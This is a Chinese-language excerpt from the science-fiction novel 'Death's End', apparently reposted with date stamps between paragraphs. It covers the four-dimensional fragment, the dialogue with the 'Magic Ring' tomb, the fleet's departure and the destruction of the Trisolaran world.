<p>禇岩决定两艘飞船立刻退出四维碎块。碎块在整体上有一个远离太阳系的速度，与飞船的航行速度方向相同，所以尽管“蓝色空间”号和“万有引力”号飞离太阳系的速度很快，但它们与四维碎块间的相对速度很小，两舰只是慢慢追上了碎块，目前只深入了很小的距离，减速退出它也很容易。</p>
<p>但关一帆对这个决定暴跳如雷：“宇宙最大的秘密就在眼前，这里可能隐藏着宇宙学一切问题的答案，我们怎么能离开？！”“你说的是‘三与三十万综合征’吗？四维碎块真让我想到了它。”</p>
<p>“即使从现实考虑，我们也可能从那个圆环废墟中得到意想不到的东西！”“但这一切的前提是要生存下去，现在，两舰随时面临毁灭。”</p>
<p>关一帆叹息着摇摇头，“那好吧，离开前让我乘太空艇去探测一下‘魔戒’，你不是谈生存吗？给我一次机会吧，也许我们以后的生存取决于我这次的发现！”</p>
<p>2016-01-28</p>
<p>人类曾经在四维空间进行过的最长的航行，是“蓝色空间”号对水滴和“万有引力”号的袭击。当时曾用太空艇通过四维接近“万有引力”号，首先把包括朴义君少校在内的三人通过翘曲点送入飞船进行侦察，然后分三批把六十多名陆战队员从四维投放到飞船中。对水滴的攻击则使用小一些的太空穿梭机。但这一次，对“魔戒”的探险航程则远得多。</p>
<p>2016-01-28</p>
<p>航行持续了三个小时，太空艇已经超出了曾经在四维空间进行的最远的航行距离，“魔戒”看上去仍然是一个点，但卓文却更加谨慎了，随时做好全力减速和紧急转向的准备。关一帆有些不耐烦了，请求卓文提高些速度，就在这时，韦斯特惊叫起来，“魔戒”显示出圆环形状，是突然显示的，由一个点瞬间变成硬币大小，没有逐渐增大的过程。</p>
<p>“要随时记住：在第四个维度上我们是瞎子。”卓文说，并再次放慢速度。</p>
<p>2016-01-28</p>
<p>航行又持续了两个多小时，如果在三维，太空艇已经航行了二十万千米左右。</p>
<p>突然间，硬币大小的“魔戒”顶天立地地出现在前方。卓文用目光操纵太空艇紧急转向，使撞向环箍的太空艇从“魔戒”的圆环中穿过。从艇中看去，像是通过了太空中一道巨大的拱门。太空艇全力减速，然后返回，悬停在距“魔戒”的圆心不远处。</p>
<p>2016-01-28</p>
<p>这是人类第一次近距离看到四维物体，与高维空间感相似，他们感受到了被称为高维质感的宏伟。“魔戒”是全封闭的，看不到内部，但能感觉到一种巨大的纵深感和包容性。在来自三维世界的眼光中，所看到的“魔戒”不是一个“魔戒”，而是无数个“魔戒”的叠加，这种四维质感摄人心魄，是真正的纳须弥于芥子的境界。</p>
<p>2016-01-28</p>
<p>从这个距离看到的“魔戒”表面，与从飞船上用望远镜观察有很大不同。它的色彩由金黄变成了暗铜色，那些电路般的精细线条其实是碰撞的擦痕，仍然没有任何活动迹象，也没有光亮和其他辐射。看着“魔戒”陈旧的表面，太空艇上的三个人都感到似曾相识，他们想起了被摧毁的水滴，进而想象：如果这个巨大的四维圆环也曾有过晶亮的镜面表面，那又是何等惊人的景象。</p>
<p>2016-01-28</p>
<p>按照计划，卓文用中频电波发送了一个问候语。这是一幅简单的点阵图，图中由六行不同数量的点组成了一个质数数列：2、3、5、7、11、13。</p>
<p>他们没有指望得到应答，但应答立刻出现了，速度之快让三人不敢相信自己的眼睛。悬浮在太空艇舱里的信息窗口显示出一个简单点阵图，与他们发送的类似，也用六行点组成六个质数，但图中的点阵大了许多，把他们发送的那个数列接了下来：17、19、23、29、31、37。对方的含义很明确，回答了他们的问候。</p>
<p>2016-01-28</p>
<p>“那就把罗塞塔系统发给‘它’吧。”</p>
<p>“这需要请示。”罗塞塔系统是一个为了三体世界的地球语言教学而研制的数据库，数据库中包含了约两百万字的地球自然史和人类历史的文字资料，还有大量的动态图像和图画，同时配有一个软件将文字与图像中的相应元素对应起来，以便于对地球语言的译解和学习。</p>
<p>2016-01-28</p>
<p>在“万有引力”号用中微子信号发送罗塞塔系统后的三分钟，太空艇收到了来自“魔戒”的一系列点阵图，第一幅是很整齐的一个8×8点阵，共六十四个点；第二幅图中点阵的一角少了一个点，剩下六十三个；第三幅图中又少一点，剩六十二个……</p>
<p>“这是倒计数，也相当于一个进度条，可能表示‘它’已经收到了罗塞塔，正在译解，让我们等待。”韦斯特说。“可为什么是六十四点呢？”“使用二进制时一个不大不小的数呗，与十进制时的一百差不多。”</p>
<p>卓文和关一帆都很庆幸能带韦斯特来，在与未知的智慧体建立交流方面，心理学家确实很有才能。在倒计数达到五十七时，令人激动的事情出现了：下一个计数没有用点阵表示，“魔戒”发来的图片上赫然显示出人类的阿拉伯数字56！</p>
<p>“学得真快！”关一帆赞叹道。数字继续减小，每隔约十几秒减1，几分钟后，数字减到0。最新发来的图片上显示出四个汉字：</p>
<p>我是墓地。</p>
<p>2016-01-28</p>
<p>关一帆向通信窗口中输入一个问题，开始了人类与“魔戒”的交谈：</p>
<p>谁的墓地？这个墓地的建造者的墓地。</p>
<p>这是一艘宇宙飞船吗？曾经是飞船，死了以后就是墓地。</p>
<p>你是谁？和我们说话的是谁？我是墓地，墓地在和你们说话，我是死的。</p>
<p>你是说你是乘员已经死去的飞船本身，或者说是飞船的控制系统？（没有回答。）</p>
<p>附近区域还有许多物体，它们也都是墓地吗？大部分是墓地，不久后都要成为墓地，我不认识它们。</p>
<p>你们是从远处来的，还是一直在这里？我从远处来，它们也从远处来，从不同的远处来。</p>
<p>从哪里来？海。</p>
<p>这片四维空间是你们建造的吗？（没有回答。）</p>
<p>你们说自己从海里来，海是你们建造的吗？这么说，这片四维空间对于你，或者说对于你的建造者，是类似于海洋的东西吗？是水洼，海干了。</p>
<p>为什么这么小的空间里聚集了这么多的飞船，或者说墓地？海干了鱼就要聚集在水洼里，水洼也在干涸，鱼都将消失。</p>
<p>所有的鱼都在这里吗？把海弄干的鱼不在。</p>
<p>对不起，这话很费解。把海弄干的鱼在海干前上了陆地，从一片黑暗森林奔向另一片黑暗森林。</p>
<p>2016-01-28</p>
<p>这句话中最后两个相同的词像两声霹雳，让太空艇上的三人，以及远处两艘母船上通过微弱信号监听的人们都打了一个寒战。</p>
<p>黑暗森林……是什么意思？就是你们的意思。那你会攻击我们吗？</p>
<p>我是墓地，我是死的，谁都不会攻击。不同维度之间没有黑暗森林，低维威胁不到高维，低维的资源对高维没有用。但同维的都是黑暗森林。能给我们一些建议吗？</p>
<p>快离开水洼，你们是薄薄的画儿，你们脆弱，在水洼里很快就会变成墓地……呀，你的小船上好像有鱼。</p>
<p>2016-01-28</p>
<p>关一帆愣了好几秒钟才想到，太空艇上真的有鱼，那是他随身带着的一个小生态球，比拳头稍大一些。那个玻璃球内看上去只有一条小鱼和几片海藻，却是一个精心设计的封闭小生态系统。这是关一帆最喜爱的东西，出发前他特意带上，如果回不去，这东西就做他的陪葬品了。</p>
<p>我喜欢鱼，能送给我吗？怎么送？</p>
<p>扔过来。三人扣上宇宙服的头盔，打开太空舱的舱盖，关一帆把生态球举到眼前，在四维中小心地从三维的方向托住玻璃外壁，最后看了一眼。从四维看去，生态球的无限细节展现无遗，使这个小小的生命世界显得异常丰富多彩。关一帆挥臂把生态球向“魔戒”方向扔出去，看着那小小的透明球消失在四维太空中。然后他们关上舱盖，继续对话：宇宙中只有这一个水洼吗？</p>
<p>没有回答。之后，“魔戒”完全沉默了，无论怎样联系都不再回应。这时，母舰传来信息，“蓝色空间”号又遭到了一次微陨石的袭击，两舰周围的各种飘浮物也迅速增多，还出现了小尺寸的四维物体，疑似飞船或建筑的碎片。禇岩命令他们立刻返回，登上“魔戒”的计划取消了。</p>
<p>由于掌握了距离，返回时太空艇的速度提高了一倍多，只用两个多小时就回到了母舰附近，并顺利地找到翘曲点回到“蓝色空间”号上。探险队成为英雄，受到了热烈的欢迎，虽然他们的发现对两舰的未来并无实际意义。</p>
<p>2016-01-28</p>
<p>还是用我们的比喻比较直观：在一张直径一百六十亿光年的大纸上粘着一个直径仅几十个天文单位的小肥皂泡，我们却正好爬进了泡内，这个概率小到可以忽略不计。可以肯定，纸面上还粘着其他肥皂泡，可能有很多。”</p>
<p>“也就是说，我们未来还会遇到。”“有一个更迷人的问题：以前遇到过吗？比如地球，已经在太空中运转了几十亿年，难道没有可能进入过四维碎块吗？”</p>
<p>2016-01-28</p>
<p>现在的关键问题是：为什么会有肥皂泡？为什么三维宇宙中会有这么多的四维碎块？”</p>
<p>“这，确实是一个巨大的秘密。”“上校，现在我感觉到，这可能还是一个黑暗的秘密。”</p>
<p>“蓝色空间”号和“万有引力”号开始退出四维碎块的航行，随着减速的启动，飞船上出现了由船尾向船头的重力。关一帆和两舰的科学军官们抓紧最后几天时间对四维空间进行观测研究，他们几乎所有的时间都待在四维中，这一方面是由于工作需要，另一方面也是因为三维的狭窄和幽闭越来越让他们难以忍受。在减速开始后第五天，突然，所有身处四维的人都在一瞬间回到了三维，他们都不是经由翘曲点回来的。从飞船的电磁辐射检测系统得知，两舰上已经没有一个翘曲点了。</p>
<p>“蓝色空间”号和“万有引力”号退出了四维碎块。这有些出乎意料，因为按照计算，还应该有二十多个小时才能退出四维碎块内部。提前退出的原因可能有两个，一是碎块在与两舰退出的相反方向加速了，一是碎块本身在缩小。人们都相信是后者，除了观测数据外，他们都记得“魔戒”的那句话：</p>
<p>海干了鱼就要聚集在水洼里，水洼也在干涸，鱼都将消失。两舰编队最后停泊在四维与三维空间的交界处附近，这里是安全的。</p>
<p>2016-01-28</p>
<p>四维碎块的边缘是无形的，眼前的太空一片空旷，像深潭中的水面一般平静。银河系的星海一如既往地发出灿烂的银光，没有任何迹象显示在不远的前方另一个维度上，隐藏着巨大的秘密。</p>
<p>2016-01-28</p>
<p>但人们很快观察到一种奇怪且壮观的现象：在前方的太空中，常常出现一些发亮的长线，那些线很细，在出现之初十分笔直，肉眼看不出宽度，长度在五千到三万千米之间。它们都是突然出现的，开始会发出蓝光，然后色彩渐渐变红，笔直的线也开始弯曲，并中断成许多小段，最后消失。经观测发现，这些长线都出现在四维碎块的边缘，仿佛有一支无形的巨笔，不断地在太空中标示出四维与三维的交界线。</p>
<p>2016-01-28</p>
<p>无人探测器飞向长线出没的太空区域，有一次侥幸在近处观察到长线出现的情景。当时探测器距长线只有一百多千米，近到用普通焦距就能看出线的宽度。长线一出现，探测器就全速向它飞去，到达时线刚刚弯曲消失。在那一区域，检测到丰富的氢和氦元素，还有许多重元素尘埃，主要是铁和硅。</p>
<p>通过对观测数据的研究，关一帆和科学军官们很快得出结论：这些长线是进入了三维空间的四维物质，由于碎块的缩小，它们进入了三维太空，瞬间衰变成三维物质。这些进入三维空间的四维物质在四维空间的体积都很小，但它们在第四维度的部分变成三维，体积骤然增大，且呈直线状展开。据计算，一块在三维投影的质量只有几十克的四维物质，三维展开后可以形成一条上万千米的长线。现在，两舰面对这样一个事实：按照四维碎块边缘后退的速度，在二十天左右，“魔戒”将进入三维太空！两舰将等待目睹这一宇宙奇观，反正现在他们有的是时间。以前方不断划出的长线为标志，两艘飞船谨慎地向前推进，与后退的碎块边缘保持着同样的速度。</p>
<p>在接下来的十几天里，关一帆沉浸在思考和计算中，科学军官们也在热烈讨论。最后大家一致同意，按现有的理论物理学，无法对四维碎块进行太多的理论分析，但经过三个世纪发展的理论至少能够做出一项与现实相符的预测：处于宏观状态的高维度会向低维度跌落，就像瀑布流下悬崖一样，这就是四维碎块不断缩小的原因：四维空间都跌落到三维。那个丢失的维度并没有消失，它从宏观蜷缩到微观，成为蜷缩在微观的七个维度中的一个。</p>
<p>用肉眼又能够再次看到“魔戒”了，这个自称是墓地的存在即将在三维宇宙中毁灭。这时，“蓝色空间”号和“万有引力”号同时停止前进，并后退了三十万千米，因为“魔戒”进入三维太空时，在维度跌落过程中将放出巨大的能量，这也是之前出现的那些长线发光的原因。二十二天后，四维碎块的边界退过了“魔戒”。在它进入三维太空的那一瞬间，宇宙仿佛被拦腰斩断，长长的断口发出炫目的强光，如同一颗恒星被瞬间拉成一条线。当光芒黯淡一些后，一条横过整个太空的长线显现出来，从飞船上看不到它的头和尾，像上帝在宇宙的绘图板上比着丁字尺从左到右画了一道。据测量，这条把可见的宇宙分成两部分的线，其长度接近一个天文单位，约一亿三千万千米，几乎可以把地球和太阳连接起来。与以前出现的那些长线不同，这条线即使从几十万千米外仍能看出其宽度。长线发出的光由蓝白变成红色，然后渐渐黯淡下去，线本身也变得宽散弯曲，由一条笔直的长线变成一道尘埃带，弯弯曲曲不见首尾。它自身已经不发光，但浸透了星海的光芒，变成宁静的银灰色。两艘飞船上观看的人们这时都有一个奇怪的印象，感觉尘埃带看上去很像宇宙背景上的银河系，刚才发生的仿佛是一次对银河系的宏大摄影，闪光灯闪过后，拍下的照片在太空中渐渐显影。</p>
<p>2016-01-28</p>
<p>看着这壮丽的景象，关一帆有些伤感，他想起了自己送给“魔戒”的生态球，它只拥有了那个礼物不长的时间。在三维展开的一刹那，“魔戒”内部的所有四维结构都被完全破坏，这是一场最彻底的毁灭。四维碎块中其他那些已经死去或仍活着的飞船，最终也都无法逃脱这样的命运，在这广阔的宇宙中，它们只能在四维碎块这个小小的角落中存在。</p>
<p>一个巨大而黑暗的秘密。</p>
<p>2016-01-28</p>
<p>现在，两艘飞船应该考虑自己的未来了。由“蓝色空间”号和“万有引力”号共同组成的一个临时委员会宣布，两艘飞船上的任何人都可以做出选择：随两舰继续航行或返回太阳系。两舰将装配一个独立于两舰的冬眠舱，并把两舰上七台聚变发动机中的一台用于推进它，决定返回的人将乘坐这艘临时装配的飞船，在冬眠中返回太阳系，航行时间预计为三十五年。两舰将用中微子通信通知地球冬眠飞船的轨道参数，以便在它到达太阳系时进行接应。为了防止三体世界借此侦测到两舰的位置，与地球的联系将在冬眠飞船起航一段时间后再进行。如果地球方面能够在飞船到达太阳系前派出接应飞船协助减速的话，加速段就有更多的燃料用于推进，返回的航程可以缩短至十几年。</p>
<p>如果那时还有太阳系和地球的话。</p>
<p>2016-01-28</p>
<p>只有两百多人选择返回，其余的人不想回到那个正在走向毁灭的世界，决定随“蓝色空间”号和“万有引力”号继续航行，飞向未知的太空深处。</p>
<p>一个月后，两舰编队和冬眠飞船同时起航，各自飞向不同的方向：冬眠飞船沿来路返回太阳系，“蓝色空间”号和“万有引力”号则计划绕过四维碎块，然后再确定一个新的目标星系。聚变发动机的光芒照亮已经稀薄的尘埃云带，将它映成了金红色，像地球温馨的晚霞，使所有的人，回家的和远行的，都热泪盈眶。美丽的太空晚霞很快消失，永恒之夜又笼罩了一切。</p>
<p>人类文明的两粒种子继续向星海深处飘去，不管命运如何，一切总算又开始了。</p>
<p>广播纪元7年，程心</p>
<p>2016-01-28</p>
<p>艾AA说程心的眼睛比以前更明亮更美丽了，也许她没有说谎。程心以前有中度近视，但现在视野异常清晰，感觉世界像刷新了一样。</p>
<p>从澳大利亚返回已经六年了，但移民的苦难和这六年时光几乎没在AA身上留下痕迹，她就像一株鲜活水灵的植物，岁月和苦难的水珠都从她光滑的叶片上滚落，一点儿都沾不上。</p>
<p>2016-01-28</p>
<p>现在的世界也确实刷新了。得知引力波宇宙广播启动后，全世界为此欢呼不已。“蓝色空间”号和“万有引力”号成为神话般的拯救之船，两艘飞船上的成员也成为万众崇拜的超级英雄。“蓝色空间”号在黑暗战役中的谋杀嫌疑被推翻，确认为是受到攻击后的正当自卫。同时成为英雄的还有移民时期在各大陆坚持战斗的地球抵抗运动成员。当那些衣衫褴褛的抵抗战士出现在公众面前时，所有的人都热泪盈眶。一时间，两艘飞船和抵抗战士成为人类伟大精神的象征，而无数的崇拜者在不知不觉之间感觉自己也一直拥有这种精神。</p>
<p>2016-01-28</p>
<p>随之而来的是对地球治安军的疯狂报复。其实从客观上来说，在这场灾难中，治安军起到的正面作用远比抵抗运动多。他们在移民期间保护了城市和其他基础设施，虽然是为即将到来的三体文明保存的，但保证了移民返回后世界经济的快速复苏。在移民返回过程中，由于粮食短缺和电力中断，澳大利亚几度陷入失控的混乱，也是进入澳大利亚的治安军保证了基本的供给并维持了秩序，保证了大疏散在没有重大伤亡的情况下于四个月内完成。在那样的大混乱中，如果没有这支装备精良的武装力量，后果将不堪设想。但这一切均不被法庭考虑，所有的治安军成员都受到审判，有一半被判为反人类罪。大移民期间，大部分国家都恢复了死刑，从澳大利亚返回后也并没有取消。五年中，不断有大批的前治安军成员被处决，而对此欢呼雀跃的人群中，有相当一部分是当初在治安军报名中的落选者</p>
<p>2016-01-28</p>
<p>这种祥和是建立在这样一个事实的基础上：在罗辑的黑暗森林试验中，从把187J3X1恒星坐标向宇宙广播到该恒星被摧毁，其间有一百五十七年时间，这正好是现代人的平均寿命。这时，人类也出现了有史以来最低的出生率，人们不想把孩子带到一个注定要毁灭的世界上来——但大部分人都认为自己可以平安地度过一生。人们也看到了这样一个事实：引力波的宇宙广播能力比当初的太阳电波放大要强得多，不过，人类很快找到了一个更大的自我安慰：对黑暗森林理论本身的质疑。</p>
<p>2016-01-28</p>
<p>宇宙迫害妄想——对黑暗森林理论的最后质疑</p>
<p>虽然自威慑纪元以来的六十多年里，黑暗森林理论已成为人类历史的一个大背景，但学术界对它的真实性的质疑一直存在，直到广播纪元开始时，一直没有一个能够从科学角度证明它的确凿证据，已有的几个证据都缺乏坚实的科学基础。疑点一：罗辑的黑暗森林试验导致187J3X1恒星系被摧毁。该星系是否真是由外部的智慧力量所摧毁一直存在争议。最大的质疑来自天文学界，主要观点有两种：一种观点认为，所观察到的击中恒星的光速物体不足以摧毁恒星，187J3X1星系的毁灭可能是一次自然的超新星爆发，由于之前对这颗恒星的参数掌握不足，无法确定它是否具备新星或超新星爆发的条件；但也无法证伪，考虑到由坐标广播到恒星毁灭的时间跨度，这种可能性是相当大的。第二种观点承认该恒星是被光速物体摧毁，但认为光粒可能是银河系中的一种自然现象。虽然迄今为止没有观察到第二个光粒现象，但确实观察到大质量物体被自然力量加速到极高速度的例子，曾经观测到有恒星被星团的引力以极高速度甩出银河系，有学者认为，银河系中心的超级黑洞完全有可能把小质量物体加速到极接近光速，这种光速物体可能在银心大量产生，只是由于其体积很小难以发现。</p>
<p>疑点二：三体世界对黑暗森林威慑的恐惧。这是迄今为止对黑暗森林理论最有力的证明，但三体世界本身所掌握的证据和其论证的过程一直不得而知，所以在科学上也无法被视为直接的证明。三体世界有可能因为别的未知原因同人类建立起威慑平衡，并且最终放弃对太阳系的占领。对这种未知原因的假说有许多种，虽然没有一种有绝对的说服力，但也都无法证伪。还有学者提出一种“宇宙迫害妄想”学说，认为三体世界本身也并没有掌握黑暗森林理论的确切证据，只是由于其长期所处的极端险恶的环境，使其对宇宙社会产生了一种群体的迫害妄想，这种群体妄想类似于地球中世纪的宗教，被大多数三体人信以为真。疑点三：“魔戒”对黑暗森林理论的确认。“魔戒”显然是从发给它的罗塞塔系统中人类历史资料的最后部分得知“黑暗森林”这个词的。这个词在人类威慑纪元的历史资料中频繁出现，被其引用是可以理解的。但在“魔戒”与探险队的对话中，这一部分十分简短含糊，不足以证明“魔戒”确实理解了该词的含义。威慑纪元以来，对黑暗森林理论的研究已成为一门独立的学科。除了理论研究外，还进行了大量的宇宙观测和计算机模拟，从不同角度建立了众多的数学模型，但在大部分学者眼中，该理论还只是一个无法证实也无法证伪的假说。真正相信黑暗森林理论的是政治家和公众，而后者显然更多是根据自身所处的境遇，选择是相信还是否定它。在广播纪元开始后，大众越来越倾向于认为黑暗森林理论真的是一个宇宙迫害妄想。</p>
<p>2016-01-28</p>
<p>随着一切都尘埃落定，人们的注意力从宇宙广播转移到对威慑纪元结束至今的整体事件的回顾和反思上来。对执剑人的指责和声讨开始铺天盖地地出现，如果在事变之初执剑人就启动宇宙广播，至少可以避免后来的移民灾难。但舆论的主要抨击焦点集中在对执剑人的选择上。这是一个十分复杂的过程，由世界民意形成的政治压力促成了当时联合国和舰队国际的最后决定，人们激烈地争论着该由谁负责，但几乎没有人提出这是所有人的群体意志导致的结果。舆论对程心本人还是相对宽容的，她美好的公众形象为自己提供了一定的保护，同时她作为一个普通移民经历的苦难也博得了同情，人们更多地把她看做一个受害者。</p>
<p>2016-01-28</p>
<p>澳大利亚与中国的时差在两个小时左右，程心渐渐适应了老人的作息时间，每当听到老人的声音，她就想象自己也生活在那遥远沙漠中的树林里，被与世隔绝的宁静笼罩着。</p>
<p>这天深夜，睡梦中的程心突然被电话铃声惊醒，一看是弗雷斯打来的。这时是凌晨1点14分，在澳大利亚是凌晨3点左右。弗雷斯知道程心处于严重的失眠中，如果不借助催眠器，一天只能睡两三个小时，他平时绝对不会在这时打扰她。这次，他电话中的声音也失去了往常的和缓沉稳，变得急促而紧张：“孩子，快出去看天上！”其实程心在房间里也发现了外面的异常。刚才艰难的睡眠中，她正在做噩梦，这梦中的情景以前也常出现：夜色笼罩的平原中央有一座巨大的陵墓，一片幽幽的蓝光从陵墓中透出，照亮了附近的地面……现在，外面就是一片这样的蓝光。程心走到阳台上，看到天空中有一颗发出蓝光的星星，其亮度压过了所有的星光，它位置恒定，很容易同运行在近地轨道上的太空设施区分开，是一颗太阳系外的恒星。它的亮度还在急剧增加，很快照出了地面上的人影，使城市的灯海黯然失色。约两分钟后，这颗恒星的亮度达到峰值，比满月还亮，使人无法正视，光的色彩也由幽蓝变成惨白，把城市照得亮如白昼。程心知道那是哪里，近三个世纪以来，那是人们仰望夜空时看得最多的一个位置。</p>
<p>附近的巨树建筑中传来惊叫声，还有什么东西破碎的声音。那颗星的光度在达到峰值后渐渐减弱，由白变红，大约半个小时后，完全熄灭了。程心出来时没拿电话，但通话窗口跟随着她，她仍能听到弗雷斯的声音，这声音又恢复了沉稳和超然：“孩子，不要怕，该发生的总要发生。”</p>
<p>安逸的美梦彻底破灭，黑暗森林理论得到了最后的证实，三体世界被摧毁了。</p>
<p>广播纪元7年，智子</p>
<p>2016-01-28</p>
<p>黑暗森林的新模型</p>
<p>三体世界应该是在广播纪元三年零十个月被摧毁的，引力波宇宙广播后这么短的时间就引来了打击，这出乎所有人的预料。</p>
<p>2016-01-28</p>
<p>由于三体星系一直处于密切监视之中，所以对这次事件掌握了较为详细的资料。三体星系受到的打击与罗辑进行试验的187J3X1恒星受到的打击完全一样：是一个极端接近光速的小体积物体，借助于相对论效应产生的质量膨胀摧毁恒星。被摧毁的是三体星系三星中的一颗，时机选择得很精确，这颗恒星被击中时，刚刚捕获了三体行星成为它的卫星，恒星爆发时行星被完全摧毁。</p>
<p>2016-01-28</p>
<p>万有引力”号在启动引力波广播时，与三体星系相距约三光年，考虑到引力波以光速传播的时间，光粒的发射点应该比两艘飞船更接近三体星系，而且几乎是接到信息马上发射。观测数据也证实了这点，光粒穿过三体星系附近尘埃云的尾迹被清晰地记录下来。但这个范围的太空中肯定没有其他恒星系，这就是说，光粒是从某个宇宙飞行器上发射的。</p>
<p>黑暗森林理论以前的模型主要是以恒星系为基础的，人们想当然地认为，对坐标已经被广播的恒星系的打击，都是来自于其他恒星系。如果宇宙飞行器也能够成为打击源，情况便骤然复杂起来。相较于对恒星位置的精确掌握，除三体舰队外，人类对于宇宙中智慧体制造的飞行器一无所知，它们的数量、密度、速度和航向等全都是未知，这使得黑暗森林打击的可能来源更加扑朔迷离，打击的出现也更加迅捷。除三体星系外，距太阳系最近的恒星也有六光年，但那些幽灵般的异类宇宙飞船可能就从太阳附近穿过。原以为远在天边的死神，赫然出现在眼前。</p>
<p>2016-01-28</p>
<p>人类世界第一次目睹了一个文明的毁灭，而这样的命运随时都会落到自己头上。绵延了近三个世纪的三体威胁烟消云散，现在人类面对的是更加冷酷的整个宇宙。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>我也面对一个更冷酷的世界</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-28</p>
<p>在悬挂智子别墅的树枝上，程心见到了罗辑。大移民期间，罗辑一直和抵抗运动在一起，他没有参加或指挥过任何行动，但一直是抵抗战士们的精神领袖。治安军和水滴都在疯狂地搜索并欲消灭他，但不知道他是如何隐蔽的，即使是智子都找不到他的行踪。现在，程心见到的罗辑仍是那副挺拔冷峻的样子，除了在风中飘拂的须发更白了一些，七年的时光几乎没有在他身上留下更多痕迹。他没有说话，但向程心致意时露出的微笑让她感到很温暖。罗辑让程心想起了弗雷斯，他们是完全不同的两种人，但都带来了公元世纪某种山一般强大的东西，让程心在这陌生的新纪元有一种依靠。还有维德，那个差点杀了她的像狼一般邪恶凶狠的公元男人，她对他既恨又怕，但在他身上，她居然也感到一种依靠，这感觉真的很奇怪。</p>
<p>2016-01-28</p>
<p>子在别墅门前迎接他们，她又穿上了华美的和服，圆发髻上插着鲜花。那个穿迷彩服的凶悍忍者消失得无影无踪，她又变回了一个如花丛中的清泉一般的女人。</p>
<p>2016-01-28</p>
<p>欢迎，欢迎。本该到府上拜访，可那样就不能用茶道来招待了，请多多见谅，真的很高兴见到你们。”智子鞠躬，说着程心第一次在这里见到她时一样的话，声音也一样柔细。她引着两人走过竹林中的庭院，走过淙淙清泉上的小木桥，进入那个大亭子似的客厅。然后，三人在榻榻米上坐下，智子开始摆弄茶道，时间在宁静中流逝，任窗外的蓝天上云卷云舒。</p>
<p>2016-01-28</p>
<p>看着智子轻柔飘逸的动作，程心百感交集。</p>
<p>2016-01-28</p>
<p>是的，她（他们？它们？）本来是能够成功的，且每一次都几乎成功了，但人类每一次都凭借顽强、狡诈和机遇挽回了败局。三个世纪的漫漫征程，最后只落得母星家园在火海中陨灭。</p>
<p>智子早在四年前就知道了三体世界毁灭的消息。在三天前毁灭的光信号传到地球后，她曾对国际社会发表了一个简短的讲话，只是简单地通报了灾难的过程，对灾难的起因——人类两艘飞船所启动的引力波宇宙广播——没有作任何评价，更没有谴责。人们有理由怀疑，四年前在四光年外的三体行星上控制这个机器人的那些三体人已经葬身火海，现在她的控制者可能身处三体舰队的飞船。智子讲话时的表情和声音都很平静，这种平静不是之前仅仅充当传声筒时的呆滞，而是控制者灵魂和精神的真实体现，显示出面对毁灭时人类无法企及的高贵和尊严。面对这个母星世界已经毁灭的文明，所有人都感到从未有过的敬畏。通过智子提供的有限信息和人类的观测数据，可以大致勾勒出三体世界毁灭的景象。</p>
<p>灾难发生时，三体行星正处于一个稳定的恒纪元中，围绕着三星中的一颗恒星运行，轨道半径约0.6个天文单位。恒星被光粒击中后，光球层和对流层上被击出一个巨大的裂孔，孔的直径达五万千米，可以并排放下四个地球。不知是偶然还是攻击者有意为之，光粒击中恒星的位置正在行星运行的黄道面上。从三体行星上看去，那个太阳的表面出现了一个光度极强的亮斑，它像熔炉的大门，太阳深处的强辐射通过裂孔，穿透光球层、对流层和色球层，直接照射到行星上。暴露在光斑下的那个半球之上，处于室外的生命在几秒钟内就被烤焦。接着，恒星内部的物质从裂孔喷涌而出，形成了一股五万千米粗的烈焰喷泉。喷出的太阳物质温度高达千万度，一部分在引力的作用下落回太阳表面，一部分则达到了逃逸速度，直冲太空。从行星上看去，太阳表面仿佛长出了一棵灿烂的火树。约四小时后，喷出物质穿过0.6个天文单位的距离，火树的树顶与行星轨道相交。又过了两个小时，运行中的行星接触了火树的树梢，然后在喷出物质带中运行了三十分钟，这段时间，行星等于是在太阳内部运行，喷出物质经过太空的冷却后仍有几万摄氏度的高温。当行星移出喷出物质带后，它已经是一个发出暗红色光芒的天体，表面均被烧熔，岩浆的海洋覆盖了一切。行星的后面拖着一道白色的尾迹，那是被蒸发的海洋的水蒸气；而后尾迹被太阳风吹散，行星变成了一颗披散着白色长发的彗星。这时，行星表面已经没有生命，三体世界已经毁灭，但灾难的引信才刚刚点燃。</p>
<p>喷出带对行星产生了巨大的阻力，行星在穿过后运行速度降低，轨道下降了一些。火树像太阳伸出的魔爪，一次次拉低行星，只要穿过喷出带十次左右，行星就会坠落到太阳表面，三体星系中漫长的宇宙橄榄球赛将迎来大结局，但这个太阳没有活到成为冠军的那一刻。由于喷出物质导致压力降低，恒星内部的核聚变反应暂时变弱，于是这个太阳迅速暗下去，最后只能看到一个朦胧的轮廓，这使得太阳表面的火焰巨树更加醒目耀眼，仿佛是在宇宙的底片上用尖利物划出来的。随着聚变的熄灭，内部辐射压力已不足以支撑恒星的外壳，太阳开始坍缩，最终黯淡下去的外壳接触并挤压内核，引发了最终的大爆发。</p>
<p>这就是三天前地球上的人们看到的那一幕。</p>
<p>2016-01-28</p>
<p>恒星爆发摧毁了三体星系的一切，星系内正在逃离的大部分飞船和太空城都被毁灭，只有极少数的飞船侥幸逃脱——当时，这些飞船正处于另外两颗太阳后面，这两颗没有受到打击的恒星在大爆发中起到了掩体的作用。</p>
<p>以后，剩下的两轮太阳将组成一个稳定的双星系统，但再也没有生命来享受有规律的日出日落了。爆发的恒星物质和破碎的行星在两轮太阳周围形成广阔的吸积盘，像两片灰色的墓场。“有多少人逃离了？”程心轻轻地问。</p>
<p>“加上已经远航的舰队，不到千分之一。”智子回答的声音更轻，她仍专心于茶道，没有抬头。</p>
<p>2016-01-28</p>
<p>。以下的谈话被称为“茶道谈话”，对后来的历史进程产生了重要影响。</p>
<p>“我们还有多长时间？”程心问。“不能确定，打击随时都会到来，但按照概率，应该还有一段时间，可能长达一两个世纪，就像你们上一次进行的试验那样。”智子看了罗辑一眼。后者正襟危坐，不动声色。</p>
<p>“可是……”“三体世界与太阳系的情况不同。首先，被广播的是三体星系的坐标，如果由此觉察到地球文明的存在，就要查阅近三个世纪前双方首次通信的资料；肯定会被查阅的，但查阅和决定发起打击同时发生的概率比较小；肯定会发生，但需要时间。还有更重要的一点：从远距离观察，三体星系看起来比太阳系更危险。”</p>
<p>程心吃惊地看了罗辑一眼，后者仍不动声色，她问：“为什么？”智子坚决地摇摇头，“这永远不能告诉你们。”</p>
<p>程心使谈话回到预定的轨道上来，“已有的两次打击都是用光粒摧毁恒星，这是普遍的打击方式吗？未来对太阳系的打击也会是这样的吗？”“黑暗森林打击都有两个相同的特点：一、随意的；二、经济的。”“请解释一下。”</p>
